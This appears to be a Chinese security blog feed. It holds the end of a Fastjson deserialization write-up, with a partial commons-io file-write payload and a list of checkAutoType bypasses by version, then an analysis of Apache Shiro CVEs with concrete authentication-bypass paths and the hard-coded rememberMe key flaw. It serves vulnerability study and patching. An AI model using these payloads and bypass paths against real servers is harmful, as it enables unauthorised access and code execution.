class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">   <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">					<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;boms&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">						<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">							<span class="number">36</span><span class="punctuation">,</span><span class="number">82</span></span><br><span class="line">						<span class="punctuation">]</span></span><br><span class="line">					<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">				<span class="punctuation">&#125;</span></span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span>	</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>这里的原理和上面的读文件相同，只不过在构造ReaderInputStream时，传入的reader为XmlStreamReader，触发了commons-io文件读写那条链</p>
<p>后面<code>su17、su18、su19</code>是为了触发三次写入，之前说过写一次限制为4096字节，而只有当写入超过8192字节才会刷新缓存区真正写入到文件中；</p>
<p>XmlStreamReader在构造器方法中会触发doRawStream()方法，在doRawStream()方法中触发getBOMCharsetName()，在getBOMCharsetName()中触发getBOM()，getBOM()触发TeeInputStream的read()方法，此时TeeInputStream为同一个对象（因为引用了上一个对象），就可以达循环读写。</p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>还有其他一些比较冷门的利用链，就没必要看了</p>
<h2 id="fastjson-x3D-1-2-83"><a href="#fastjson-x3D-1-2-83" class="headerlink" title="fastjson&#x3D;1.2.83"></a>fastjson&#x3D;1.2.83</h2><p>1.2.83中，在ParserConfig的checkAutoType中，</p>
<p>若为Throwable的子类，则clazz置null，并返回</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303251334869.png" alt="image-20230325133416331"></p>
<p>同时类名以Exception或者Error结尾的都会返回null</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303251348964.png" alt="image-20230325134824889"></p>
<p>两层防御导致有关ThrowableDeserializer那条链的绕过失效；</p>
<p>重新审视这张图</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303201444419.png" alt="image-20230320144417368"></p>
<p>唯一能利用expectClass进行绕过的只有JavaBeanDeserializer这条链，而需要有一个类满足一些条件，且他的deserializer为JavaBeanDeserializer，这时就可以绕过checkAutoType的检测；</p>
<p>1.2.83及以上未爆出新的漏洞了，但是根据FastJSON的尿性，估计肯定还会有不少漏洞，肯定也有不少师傅存着一些POC在偷偷利用也说不定；</p>
<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>1.2.24之下无限制，随便玩</p>
<p>1.2.25到1.2.41新增黑白名单，使用<code>L</code>开头<code>;</code>结尾进行绕过</p>
<p>1.2.42双写<code>L</code>开头<code>;</code>结尾进行绕过</p>
<p>1.2.43使用<code>[</code>进行绕过</p>
<p>1.2.47及以下使用MiscCodec类刷新缓存绕过</p>
<p>1.2.48cache为false，不给存入缓存</p>
<p>1.2.48到1.2.80利用expectClass绕过</p>
<p>-1.2.48到1.2.68使用AutoCloseable进行绕过</p>
<p>-1.2.69到1.2.80使用ThrowableDeserializer进行绕过</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li><a href="https://github.com/threedr3am/learnjavabug/commit/ea61297cf7b2125ecae0064d2b8061a9e32db1e6">https://github.com/threedr3am/learnjavabug/commit/ea61297cf7b2125ecae0064d2b8061a9e32db1e6</a></li>
<li><a href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg</a></li>
<li><a href="http://scz.617.cn:8/web/202008100900.txt">http://scz.617.cn:8/web/202008100900.txt</a></li>
<li><a href="http://x2y.pw/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/">http://x2y.pw/2020/11/15/fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</a></li>
<li><a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></li>
<li><a href="https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html">https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html</a></li>
</ul>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro(全系漏洞分析-截至20230331)</title>
    <url>/2023/03/31/Shiro/</url>
    <content><![CDATA[<h1 id="Shiro-全系漏洞分析-截至20230331"><a href="#Shiro-全系漏洞分析-截至20230331" class="headerlink" title="Shiro(全系漏洞分析-截至20230331)"></a>Shiro(全系漏洞分析-截至20230331)</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Apache Shiro是用来做认证和授权的框架，执行身份验证、授权、密码和会话管理。</p>
<p>Shiro主要配合一些容器的使用，如Tomcat、Weblogic等；同时有些框架也会将Shiro集成用来做身份认证和授权，比如：SpringBoot等；</p>
<p>Shiro包括几个重要的类：</p>
<ol>
<li>Subject：项目，表示需要受Shiro保护的项目；</li>
<li>SecurityManager：安全管理器，管理所有Subject；</li>
<li>Realm：域，用来访问数据，比如访问数据库中的用户密码以及权限角色等信息，使用该类来完成；</li>
</ol>
<p>Shiro存在一些默认的过滤器</p>
<ul>
<li>anon：为匿名过滤器</li>
<li>authc：为登录过滤器</li>
</ul>
<p>学习shiro前要了解他的使用和原理，这样也比较好懂他的成因，下面推荐两个文章；</p>
<ul>
<li><a href="https://www.cnblogs.com/learnhow/p/5694876.html">30分钟学会如何使用Shiro</a></li>
<li><a href="https://segmentfault.com/a/1190000013875092">Shiro入门这篇就够了【Shiro的基础知识、回顾URL拦截】</a></li>
</ul>
<p>从Shiro诞生之初，到至今一共存在14个漏洞。以下是shiro官网中的漏洞报告：</p>
<ul>
<li><a href="https://shiro.apache.org/security-reports.html#cve_2023_22602">CVE-2023-22602</a></li>
<li><a href="https://shiro.apache.org/security-reports.html#cve_2022_40664">CVE-2022-40664</a></li>
<li><a href="https://shiro.apache.org/security-reports.html#cve_2022_32532">CVE-2022-32532</a></li>
<li><a href="https://shiro.apache.org/security-reports.html#cve_2021_41303">CVE-2021-41303</a></li>
<li><a href="https://shiro.apache.org/security-reports.html#cve_2020_17523">CVE-2020-17523</a></li>
<li><a href="https://shiro.apache.org/security-reports.html#cve_2020_17510">CVE-2020-17510</a></li>
<li><a href="https://shiro.apache.org/security-reports.html#cve_2020_13933">CVE-2020-13933</a></li>
<li><a href="https://shiro.apache.org/security-reports.html#cve_2020_11989">CVE-2020-11989</a></li>
<li><a href="https://shiro.apache.org/security-reports.html#cve_2020_1957">CVE-2020-1957</a></li>
<li><a href="https://shiro.apache.org/security-reports.html#cve_2019_12422">CVE-2019-12422</a></li>
<li><a href="https://shiro.apache.org/security-reports.html#cve_2016_6802">CVE-2016-6802</a></li>
<li><a href="https://shiro.apache.org/security-reports.html#cve_2016_4437">CVE-2016-4437</a></li>
<li><a href="https://shiro.apache.org/security-reports.html#cve_2014_0074">CVE-2014-0074</a></li>
<li><a href="https://shiro.apache.org/security-reports.html#cve_2010_3863">CVE-2010-3863</a></li>
</ul>
<h2 id="CVE-2010-3863"><a href="#CVE-2010-3863" class="headerlink" title="CVE-2010-3863"></a>CVE-2010-3863</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1.1.0 之前的 Apache Shiro 和 JSecurity 0.9.x 在将它们与 shiro.ini 文件中的项进行对比之前不会规范化 URI 路径，这允许远程攻击者通过精心设计的请求绕过预期的访问限制，如：<code>/./account/index.jsp</code></p>
<h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>Shiro &lt; 1.1.0</li>
<li>JSecurity 0.9.X</li>
</ul>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>远古版本了属于是，搭个环境给我整了半天。Shiro可以根据ini配置文件去读取用户名密码以及角色权限等信息用来做认证和授权；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[users]</span><br><span class="line">zhang=123,admin</span><br><span class="line">wang=123,admin,vip</span><br><span class="line"># 每一行定义一个用户, 格式是 username = password, role1, role2, ..., roleN</span><br><span class="line"></span><br><span class="line">[roles]</span><br><span class="line">admin=user:delete</span><br><span class="line"># 角色在这里定义, 格式是 roleName = perm1, perm2, ..., permN</span><br><span class="line"># 说明1: 权限名可以使用带有层次的命名方式, 使用冒号来分割层次关系, 比如 user:create 或 user:poweruser:update 权限.</span><br><span class="line"># 说明2: user:* 这样的权限, 代表具有 user:create 和 user:poweruser:update 权限.</span><br><span class="line"></span><br><span class="line">[urls]</span><br><span class="line">/static/**=anon</span><br><span class="line">/login=anon</span><br><span class="line">/authc/admin/user/delete=perms[&quot;user:delete&quot;]</span><br><span class="line">/authc/admin/user/create=perms[&quot;user:create&quot;]</span><br><span class="line">/authc/admin/**=roles[admin]</span><br><span class="line">/authc/home=roles[admin,vip]</span><br><span class="line">/authc/**=authc</span><br></pre></td></tr></table></figure>

<p>在request请求到达web容器后，会调用PathMatchingFilterChainResolver的getChain方法获取FilterChain</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303262133146.png" alt="image-20230326213317404"></p>
<p>这个pathMatches方法，其实就是比对你的ini文件中的urls标签下的每一项跟请求的uri是否相等，如果相等，则使用Shiro代理的FilterChain，即ProxiedFilterChain</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303262136188.png" alt="image-20230326213630096"></p>
<p>当执行完Shiro的ProxiedFilterChain后，就执行原来的FilterChain</p>
<p>导致该漏洞的原因就在于，PathMatchingFilterChainResolver的getChain方法中，在获取请求uri时未标准化路径</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303262141373.png" alt="image-20230326214154304"></p>
<p>它使用getPathWithinApplication获取请求URI，在getPathWithinApplication方法中继续调用getPathWithinApplication</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303262143815.png" alt="image-20230326214336787"></p>
<p>然后在WebUtils的getPathWithinApplication中，调用getRequestUri方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303262143220.png" alt="image-20230326214359185"></p>
<p>先从<code>javax.servlet.include.request_uri</code>取，取不到在调用getRequestURI获取请求uri，然后调用decodeAndCleanUriString</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303262144123.png" alt="image-20230326214445084"></p>
<p>在decodeAndCleanUriString中，59为分号，分割分号前的一部分并返回，这是因为一些中间件会在 url 处添加 <code>;jsessionid</code>，所以这里对 <code>;</code> 进行了截取。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303262146263.png" alt="image-20230326214602417"></p>
<p>全流程看下来，他并没有对路径进行标准化处理，啥是标准化处理，就是去除路径中的<code>/./</code>、<code>\\</code>以及其他一些特殊符号。</p>
<p>这就可以绕过权限认证了，当我配置了&#x2F;index需要认证才能访问，此时我就可以用&#x2F;.&#x2F;index绕过认证直接访问。</p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>在后续版本增加了标准化处理，在WebUtils的getPathWithinApplication方法中，调用了normalize进行标准化处理</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303262151400.png" alt="image-20230326215121350"></p>
<p>对路径中使用<code>\</code>的替换为<code>/</code>，如果路径为<code>/.</code>返回<code>/</code>，如果路径不以<code>/</code>开头，就给他加个<code>/</code>，然后当路径中有<code>//</code>，去除一个<code>/</code>，当路径中有<code>/./</code>，去掉<code>/.</code>，当路径中有<code>/../</code>，将直接移除<code>/..</code></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303262152085.png" alt="image-20230326215153552"></p>
<h2 id="CVE-2014-0074-x2F-Shiro-460"><a href="#CVE-2014-0074-x2F-Shiro-460" class="headerlink" title="CVE-2014-0074&#x2F;Shiro-460"></a>CVE-2014-0074&#x2F;Shiro-460</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1.2.3 之前的 Apache Shiro，当使用的 LDAP 服务器启用了无需身份验证即可绑定的功能时，允许远程攻击者通过空用户名或空密码绕过身份验证。</p>
<h3 id="适用范围-1"><a href="#适用范围-1" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>Shiro &lt; 1.2.3</li>
</ul>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>在skis提出的<a href="https://issues.apache.org/jira/browse/SHIRO-460?jql=project%20=%20SHIRO">issue</a>中，当在shiro.ini文件中指定了以下几项：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">ldapContextFactory</span> = org.apache.shiro.realm.ldap.JndiLdapContextFactory</span><br><span class="line"><span class="attr">ldapContextFactory.url</span> = ldap://abc.internal:<span class="number">389</span>/</span><br><span class="line"></span><br><span class="line"><span class="attr">adRealm</span> = org.apache.shiro.realm.activedirectory.ActiveDirectoryRealm</span><br><span class="line"><span class="attr">adRealm.ldapContextFactory</span> = <span class="variable">$ldapContextFactory</span></span><br><span class="line"><span class="attr">adRealm.searchBase</span> = <span class="string">&quot;CN=Configuration,DC=abc,DC=internal&quot;</span></span><br></pre></td></tr></table></figure>

<p>指定从AD域中去获取用户的身份信息完成认证和授权</p>
<p>这个配置文件指定了JndiLdapContextFactory类，这个类的getLdapContext方法是用来获取LDAP上下文的；</p>
<p>getLdapContext方法的执行流程是，将验证信息封装到Hashtable中，然后使用该验证信息去连接LDAP服务器，获取LDAP上下文；</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303282247524.png" alt="image-20230328224736952"></p>
<p>而关键就在于当LDAP服务器允许匿名访问（Anonymous）时，可以使用空用户和空密码登录，同时当LDAP开启任何人bind时，可以使用空用户和任意密码登录。这本质上来说是LDAP服务器的问题，但Shiro还是给了CVE且进行了修复</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303282259421.png" alt="image-20230328225927346"></p>
<p>在新版本中新增了validateAuthenticationInfo方法，但是修了等于没修</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303282306964.png" alt="image-20230328230643923"></p>
<p>他只是判断了用户名不为空且有密码就抛出异常，跟以上两种情景毫无关联，所以说修了等于没修</p>
<h2 id="CVE-2016-4437-x2F-Shiro-550"><a href="#CVE-2016-4437-x2F-Shiro-550" class="headerlink" title="CVE-2016-4437&#x2F;Shiro-550"></a>CVE-2016-4437&#x2F;Shiro-550</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>在Shiro 1.2.5之前，当没有为“remember me”功能配置密钥时，允许远程攻击者执行任意代码或通过请求参数绕过预期的访问限制。</p>
<h3 id="适用范围-2"><a href="#适用范围-2" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>Shiro &lt; 1.2.5</li>
</ul>
<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>rememberMe功能由RememberMeManager提供，RememberMeManager是个接口，其实现类为</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291138541.png" alt="image-20230329113816489"></p>
<p>在AbstractRememberMeManager中，他将密钥直接写在了代码中</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291138253.png" alt="image-20230329113857205"></p>
<p>接下来跟一下调用流程</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291156225.png" alt="image-20230329115646150"></p>
<p>在DefaultSecurityManager的createSubject方法中调用resolvePrincipals方法解析rememberMe参数，识别用户身份</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291159209.png" alt="image-20230329115937144"></p>
<p>先从context中解析用户身份，解析不到再调用getRememberedIdentity方法中解析用户身份</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291202819.png" alt="image-20230329120200763"></p>
<p>DefaultSecurityManager不具备解析rememberMe参数的能力，交由给RememberMeManager去解析，他会调用getRememberedPrincipals方法去解析rememberMe参数</p>
<p><img src="C:\Users\lixuyong\AppData\Roaming\Typora\typora-user-images\image-20230329120340100.png" alt="image-20230329120340100"></p>
<p>在AbstractRememberMeManager的getRememberedPrincipals方法中调用getRememberedSerializedIdentity获取用户标识</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291207140.png" alt="image-20230329120721039"></p>
<p>getRememberedSerializedIdentity方法中将rememberMe参数的值进行base64解码，然后返回</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291211260.png" alt="image-20230329121120219"></p>
<p>返回的字节再调用convertBytesToPrincipals进行转换</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291213210.png" alt="image-20230329121316174"></p>
<p>先AES解密，然后再反序列化，下面就没必要看了，就是常规的获取反序列化器进行反序列化，这里就造成了反序列化漏洞，可以配合CC链以及其他链去执行任意代码</p>
<p>整个流程梳理下来就是：</p>
<ol>
<li>若存在RememberMe属性，则获取他的值</li>
<li>将值进行base64解码</li>
<li>然后再进行AES解密</li>
<li>然后进行反序列化</li>
</ol>
<p>所以只要我们控制了AES密钥，同时服务器存在利用链就可以进行反序列化攻击，执行任意代码</p>
<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>如一开始看到那样，在Shiro 1.2.5之前都是使用了默认密钥，而在1.2.5及后续的版本，都是随机产生的密钥</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291222687.png" alt="image-20230329122229642"></p>
<h2 id="CVE-2016-6802"><a href="#CVE-2016-6802" class="headerlink" title="CVE-2016-6802"></a>CVE-2016-6802</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1.3.2 之前的 Apache Shiro 允许攻击者绕过预期的 servlet 过滤器并通过利用contextPath获得访问权限。</p>
<h3 id="适用范围-3"><a href="#适用范围-3" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>Shiro &lt; 1.3.2</li>
</ul>
<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>跟CVE-2010-3863有点相似，在PathMatchingFilterChainResolver的getChain方法中，获取requestURI时调用getPathWithinApplication方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303262141373.png" alt="image-20230326214154304"></p>
<p>而在getContextPath方法中未标准化路径</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291457132.png" alt="image-20230329145718059"></p>
<p>进入getContextPath方法查看，他获取contextPath后，直接URL解码并返回，未作标准化路径的操作</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291458973.png" alt="image-20230329145811886"></p>
<p>返回到getPathWithinApplication方法中，获取完contextPath之后直接截取</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291542742.png" alt="image-20230329154240696"></p>
<p>若contextPath为<code>/shiro</code>，当传递的uri为<code>/aaa/../shiro/abc</code>，此时getContextPath获取的contextPath为<code>/aaa/../shiro</code>，getRequestUri获取的requestUri为<code>/shiro/abc</code>，因为<code>/shiro/abc</code>不以<code>/aaa/../shiro</code>开头，所以直接返回<code>/shiro/abc</code></p>
<p>而为什么getContextPath返回的contextPath不是我们设置的<code>/shiro</code>呢？这是因为在Tomcat的Request的getContextPath方法对<code>/aaa/../shiro/abc</code>进行截取最后一个<code>/</code>之前的部分，得到得<code>/aaa/../shiro</code>，然后标准化后得到<code>/shiro</code>,比对我们设置的<code>/shiro</code>，若相等，就返回<code>/aaa/../shiro</code></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291623665.png" alt="image-20230329162342606"></p>
<p>正常情况下，我们配置需要登录才能访问的路径都不会带上contextPath</p>
<p>当设置需要登录才能访问的路径为<code>/abc</code>，而<code>/shiro/abc</code>成功的进行了绕过</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291618258.png" alt="image-20230329161809172"></p>
<p>由于匹配不到在Shiro中设置的路径，从而绕过了Shiro过滤器，没有Shiro过滤器的把持下，就不需要进行认证和授权</p>
<p>后续会继续分离<code>/shiro/abc</code>，进行<code>/abc</code>路由的访问</p>
<h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><p>在1.3.2及之后的版本中，在WebUtils的getContextPath中，在返回前进行了标准化处理</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291647908.png" alt="image-20230329164744859"></p>
<h2 id="CVE-2019-12422-x2F-Shiro-721"><a href="#CVE-2019-12422-x2F-Shiro-721" class="headerlink" title="CVE-2019-12422&#x2F;Shiro-721"></a>CVE-2019-12422&#x2F;Shiro-721</h2><h3 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>在1.4.2之前的Apache Shiro，当使用默认的 “rememberMe “配置时，cookies可能容易受到填充攻击。</p>
<h3 id="适用范围-4"><a href="#适用范围-4" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>Shiro &lt; 1.4.2</li>
</ul>
<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>跟Shiro无关，而是对Shiro采用的加密方式进行的攻击，所以略过，只要了解了Padding Oracle Attack 原理就能理解这个攻击的原理，这里推荐<a href="https://www.jianshu.com/p/833582b2f560">Padding Oracle Attack(填充提示攻击)详解及验证</a></p>
<h2 id="CVE-2020-1957-x2F-Shiro-682"><a href="#CVE-2020-1957-x2F-Shiro-682" class="headerlink" title="CVE-2020-1957&#x2F;Shiro-682"></a>CVE-2020-1957&#x2F;Shiro-682</h2><h3 id="漏洞描述-5"><a href="#漏洞描述-5" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1.5.2之前的Apache Shiro，当使用Apache Shiro与Spring动态控制器时，特制的请求可能导致认证绕过。</p>
<h3 id="适用范围-5"><a href="#适用范围-5" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>Shiro &lt; 1.5.2</li>
</ul>
<h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>根据提出的<a href="https://issues.apache.org/jira/browse/SHIRO-682?jql=project%20=%20SHIRO">issues</a>得知，当访问<code>/index</code>会被限制，而在后面加上<code>/</code>，则可以绕过访问限制。</p>
<p>这是由于Spring-Web和Shiro的访问路径的不同处理造成的，在Spring-Web中，<code>/resource/menus</code>和<code>/resource/menus/</code>都可以访问资源，而在Shiro中，只有<code>/resource/menus</code>才会匹配上<code>pathPattern</code>从而进行身份验证和授权之类的操作。</p>
<p>当访问<code>/index/</code>时，请求先进入Shiro的filter中，在PathMatchingFilterChainResolver进行路径匹配</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291842558.png" alt="image-20230329184245408"></p>
<p>由于设置需要身份验证的路径为<code>/index</code>，这里匹配不到返回null，然后进入Spring-Web的DispatcherServlet中，在DispatcherServlet的doDispatch方法中获取Handler</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291846673.png" alt="image-20230329184606621"></p>
<p>调用getHandler获取handler，后续在<code>PathPattern#match</code>方法中对<code>/admin/list/</code>和 <code>/admin/list</code>的匹配都会返回 true。</p>
<p>除此之外，还通报了另一个绕过，利用的是Shiro和Spring-Web对url中的<code>;</code>处理的差别来绕过校验。</p>
<p>Shiro配置中将<code>/abc/admin</code>设置成了需要认证才能访问</p>
<p>POC：<code>/abc;bbb/admin</code></p>
<p>在WebUtils的decodeAndCleanUriString方法中，他会截取分号之前的内容返回，即<code>/abc</code></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291905238.png" alt="image-20230329190507192"></p>
<p>然后会因为匹配不到Shiro的pathMatches从而绕过Shiro的filter</p>
<p>然后进入Spring-Web的处理</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291925275.png" alt="image-20230329192528228"></p>
<p>最后返回的uri为&#x2F;abc&#x2F;admin，从而成功访问到加了限制的路由</p>
<h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><p>在后续的版本中，在PathMatchingFilterChainResolver的getChain方法中，若路径最后一个符号为<code>/</code>号，则去掉</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291932106.png" alt="image-20230329193204032"></p>
<p>同时为了统一，若在配置文件中指定需要认证的路径的最后一个字符<code>/</code>，也直接去掉</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291935025.png" alt="image-20230329193525962"></p>
<p>而对于<code>;</code>的绕过，修复后直接使用contextPath、servletPath和pathInfo进行拼接得到，这些都是通过中间件的调用得到的</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303292300126.png" alt="image-20230329230021036"></p>
<p>直接获取中间件处理好的结果进行拼接，而不是自己去处理，但是有个坑点就是，他拼接完之后又会调用decodeAndCleanUriString方法去截取<code>;</code>之前的部分再标准化路径返回。</p>
<p>但是对于这个POC<code>/abc;bbb/admin</code>来说，再用decodeAndCleanUriString方法之前他已经拼接好了路径为<code>/abc/admin</code>，就不用去截取了，但是若从中间件获取到的路径带有分号的话还会去截取分号之前的部分，造成跟Spring-Web处理不相同而导致的漏洞</p>
<h2 id="CVE-2020-11989-x2F-Shiro-782"><a href="#CVE-2020-11989-x2F-Shiro-782" class="headerlink" title="CVE-2020-11989&#x2F;Shiro-782"></a>CVE-2020-11989&#x2F;Shiro-782</h2><h3 id="漏洞描述-6"><a href="#漏洞描述-6" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1.5.3之前的Apache Shiro，当使用Apache Shiro与Spring动态控制器时，一个特制的请求可能会导致认证绕过。</p>
<h3 id="适用范围-6"><a href="#适用范围-6" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>Shiro &lt; 1.5.3</li>
</ul>
<h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><h4 id="第一个绕过"><a href="#第一个绕过" class="headerlink" title="第一个绕过"></a>第一个绕过</h4><p>当Shiro使用Ant风格的路径表达式配置路径时，就有可能导致权限绕过</p>
<table>
<thead>
<tr>
<th align="center">通配符</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">?</td>
<td align="center">匹配任何单字符</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">匹配0或者任意数量的字符</td>
</tr>
<tr>
<td align="center">**</td>
<td align="center">匹配0或者更多的目录</td>
</tr>
</tbody></table>
<p>例如：<code>/admin/*</code>可以匹配<code>/admin/xxx</code>，但是不能跨目录，而<code>/admin/**</code>可以匹配<code>/admin/xxx</code>也可以匹配<code>/admin/xxx/xxx</code>，可以跨目录</p>
<p>当配置<code>/admin/*</code>需要认证才能访问，而访问的uri为<code>/admin/aa/bb</code>能进行绕过，因为<code>/admin/*</code>无法跨目录</p>
<p>此次漏洞的原因在于getPathInfo获取路径时会进行解码</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303292300126.png" alt="image-20230329230021036"></p>
<p>解码完再调用decodeAndCleanUriString又会进行一次解码</p>
<p>而进入Spring-Web的处理时，只会将uri解码一次，这就造成了此次漏洞</p>
<p>将斜杆两次编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ -&gt; %2f -&gt;%25%32%66</span><br></pre></td></tr></table></figure>

<p>此时配置<code>/admin/*</code>需要认证才能访问，我们访问<code>/admin/a%25%32%66b</code>会被Shiro解码成<code>/admin/a/b</code>，此时就绕过了匹配，当进入Spring容器时，Spring容器只会进行一次解码，将<code>/admin/a%25%32%66b</code>解码成<code>/admin/a%2fb</code>，这时候就成功的进行了访问</p>
<p>但是正常人谁会把访问的路由写成<code>/a%2fb</code>，结果还真有这种情景，就是当把路径作为参数时，</p>
<p>也就是如下情况</p>
